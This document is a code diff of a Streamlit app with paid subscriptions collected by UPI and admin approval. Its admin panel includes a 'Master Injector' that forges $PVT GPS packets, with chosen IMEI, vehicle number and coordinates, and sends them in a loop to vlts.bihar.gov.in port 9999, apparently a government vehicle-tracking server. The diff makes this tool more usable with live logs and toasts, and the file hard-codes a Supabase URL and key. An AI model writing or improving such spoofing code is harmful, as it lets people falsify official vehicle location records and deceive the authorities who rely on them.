@@ -9,7 +9,6 @@ from supabase import create_client, Client
 # --- CONFIG ---
 SUPABASE_URL = "https://grdgexcjyrhkoffimsuw.supabase.co"
 SUPABASE_KEY = "sb_publishable_48s5EvLGqu_gLXDxmRiqMQ_E34kVKqW"
-# Direct Image Link (Stable ImgBB)
 QR_URL = "https://i.ibb.co/99P60H1z/Whats-App-Image-2026-03-30-at-23-26-19.jpg"
 
 supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)
@@ -80,7 +79,7 @@ def send_packet_thread(host, port, packet, results_list, show_tag=False):
         s.sendall(final_to_send.encode('ascii'))
         time.sleep(0.1)
         s.close()
-        tag_disp = "📡 Syncing..." if not show_tag else packet.split(',')[1]
+        tag_disp = packet.split(',')[1] if show_tag else "📡 Syncing..."
         results_list.append({"Tag/Signal": tag_disp, "Status": "✅ Accepted", "Time": datetime.now().strftime("%H:%M:%S")})
     except:
         results_list.append({"Tag/Signal": "Error", "Status": "❌ Failed", "Time": datetime.now().strftime("%H:%M:%S")})
@@ -129,10 +128,8 @@ def recharge_page():
     cid = u_data.get('cid_id', 0)
     user_id = st.session_state.user
     st.title("💳 Recharge Your Plan")
-    
     pending_check = supabase.table("recharge_requests").select("id").eq("username", user_id).eq("status", "pending").execute()
     is_pending = len(pending_check.data) > 0
-    
     col_img, col_form = st.columns([1, 2])
     with col_img:
         st.image(QR_URL, caption="Scan QR to Pay", width=200)
@@ -144,7 +141,6 @@ def recharge_page():
                 icon = "⏳" if h['status'] == 'pending' else "✅"
                 st.write(f"{icon} {h['amount']} - {h['status'].title()}")
         else: st.write("No records.")
-
     with col_form:
         st.subheader("Step 1: Pay via UPI")
         st.info(f"**UPI ID:** `{contact.get('upi_id', 'admin@upi')}`")
@@ -156,7 +152,6 @@ def recharge_page():
         utr = st.text_input("UTR / Transaction ID", placeholder="12 digit number")
         plans = get_plans()
         amt = st.selectbox("Choose Plan", [f"₹{p['amount']} - {p['plan_name']} ({p['days']} Days)" for p in plans])
-        
         if is_pending:
             st.warning("⚠️ Request Pending...")
             st.button("Submit Request", disabled=True, use_container_width=True)
@@ -164,7 +159,10 @@ def recharge_page():
             if st.button("Submit Recharge Request", use_container_width=True):
                 if utr and len(mobile_no) == 10:
                     try:
-                        supabase.table("recharge_requests").insert({"username": user_id, "utr_number": utr, "amount": amt, "mobile_no": mobile_no, "cid_display": f"CID-{1000+cid}", "status": "pending"}).execute()
+                        supabase.table("recharge_requests").insert({
+                            "username": user_id, "utr_number": utr, "amount": amt,
+                            "mobile_no": mobile_no, "cid_display": f"CID-{1000+cid}", "status": "pending"
+                        }).execute()
                         st.success("✅ Request Sent!"); time.sleep(2); st.session_state.page = "dashboard"; st.rerun()
                     except: st.error("UTR used or Error")
                 else: st.warning("Check Mobile & UTR")
@@ -216,32 +214,53 @@ def admin_panel():
                     st.success(f"User {nu} Created!"); st.rerun()
 
     with menu[1]:
-        st.subheader("🚀 Master Injector")
+        st.subheader("🚀 Master Injector (Live Console)")
         vno, imei = st.text_input("V-No", "BR01P1234").upper(), st.text_input("IMEI", "865432109876543")
         lat_m, lon_m = st.number_input("Lat Master", 25.5941, format="%.7f"), st.number_input("Lon Master", 85.1376, format="%.7f")
+        
         if not st.session_state.admin_running:
-            if st.button("🔥 START MASTER", type="primary", use_container_width=True): st.session_state.admin_running = True; st.rerun()
+            if st.button("🔥 START MASTER", type="primary", use_container_width=True): 
+                st.session_state.admin_running = True
+                st.rerun()
         else:
-            if st.button("🛑 STOP MASTER", use_container_width=True): st.session_state.admin_running = False; st.rerun()
-            str_area = st.empty(); status_area = st.empty()
+            if st.button("🛑 STOP MASTER", use_container_width=True): 
+                st.session_state.admin_running = False
+                st.rerun()
+            
+            # --- LIVE LOG WINDOW ---
+            st.markdown("### 🛰️ Live Packet Logs")
+            log_container = st.empty() # For rolling strings
+            status_area = st.empty()   # For table
+            
+            all_logs = []
             while st.session_state.admin_running:
                 res, tags, dt = [], get_tags(), datetime.now().strftime("%d%m%Y,%H%M%S")
-                # STRING BOX UPDATED TO BE FULL WIDTH AND VISIBLE
-                full_string = f"$PVT,{tags[0]},2.1.1,NR,01,L,{imei},{vno},1,{dt},{lat_m:.7f},N,{lon_m:.7f},E,0.00,0.0,11,73,0.8,0.8,airtel,1,1,11.5,4.3,0,C,26,404,73,0a83,e3c8,e3c7,0a83,7,e3fb,0a83,7,c79d,0a83,10,e3f9,0a83,0,0001,00,000041,DDE3*"
-                str_area.info(f"**Full Raw String:**\n\n{full_string}")
-                for t in tags:
+                
+                # Loop through tags and show each one in a rolling log
+                for i, t in enumerate(tags):
                     p = f"$PVT,{t},2.1.1,NR,01,L,{imei},{vno},1,{dt},{lat_m:.7f},N,{lon_m:.7f},E,0.00,0.0,11,73,0.8,0.8,airtel,1,1,11.5,4.3,0,C,26,404,73,0a83,e3c8,e3c7,0a83,7,e3fb,0a83,7,c79d,0a83,10,e3f9,0a83,0,0001,00,000041,DDE3*"
+                    
+                    # Add to rolling log display
+                    all_logs.insert(0, f"[{datetime.now().strftime('%H:%M:%S')}] Sending Tag {t}...")
+                    if len(all_logs) > 5: all_logs.pop() # Keep last 5 logs
+                    log_container.code("\n".join(all_logs))
+                    
                     th = threading.Thread(target=send_packet_thread, args=("vlts.bihar.gov.in", 9999, p, res, True))
                     th.start(); th.join()
-                status_area.table(pd.DataFrame(res)); time.sleep(1.0)
-    
+                    
+                    # Update progress in title
+                    st.toast(f"Injecting: {t} ({i+1}/{len(tags)})")
+                    
+                status_area.table(pd.DataFrame(res))
+                time.sleep(1.0)
+
     with menu[2]:
         st.subheader("Pending Recharges")
         reqs = supabase.table("recharge_requests").select("*").eq("status", "pending").execute()
         if reqs.data:
             st.dataframe(pd.DataFrame(reqs.data))
             for r in reqs.data:
-                if st.button(f"Approve {r['username']} (UTR: {r['utr_number']})", key=f"app_{r['id']}"):
+                if st.button(f"Approve {r['username']} ({r['utr_number']})", key=f"app_{r['id']}"):
                     try: days = int(r['amount'].split('(')[1].split(' ')[0])
                     except: days = 28
                     user_res = supabase.table("user_profiles").select("expiry_date").eq("username", r['username']).execute()
@@ -249,6 +268,7 @@ def admin_panel():
                     supabase.table("user_profiles").update({"expiry_date": new_exp.strftime("%Y-%m-%d"), "status": "active"}).eq("username", r['username']).execute()
                     supabase.table("recharge_requests").update({"status": "approved"}).eq("id", r['id']).execute()
                     st.success("Approved!"); st.rerun()
+        else: st.write("No requests.")
 
     with menu[3]:
         st.subheader("⚙️ Settings")
@@ -256,7 +276,8 @@ def admin_panel():
         with st.form("settings_form"):
             w, e, t, u = st.text_input("WhatsApp", curr.get('whatsapp_no')), st.text_input("Email", curr.get('email_id')), st.text_input("Hours", curr.get('support_time')), st.text_input("UPI ID", curr.get('upi_id'))
             if st.form_submit_button("Save"):
-                supabase.table("contact_settings").upsert({"id": 1, "whatsapp_no": w, "email_id": e, "support_time": t, "upi_id": u}).execute(); st.success("Saved!"); st.rerun()
+                supabase.table("contact_settings").upsert({"id": 1, "whatsapp_no": w, "email_id": e, "support_time": t, "upi_id": u}).execute()
+                st.success("Saved!"); st.rerun()
 
     with menu[4]:
         st.subheader("Manage Tags")
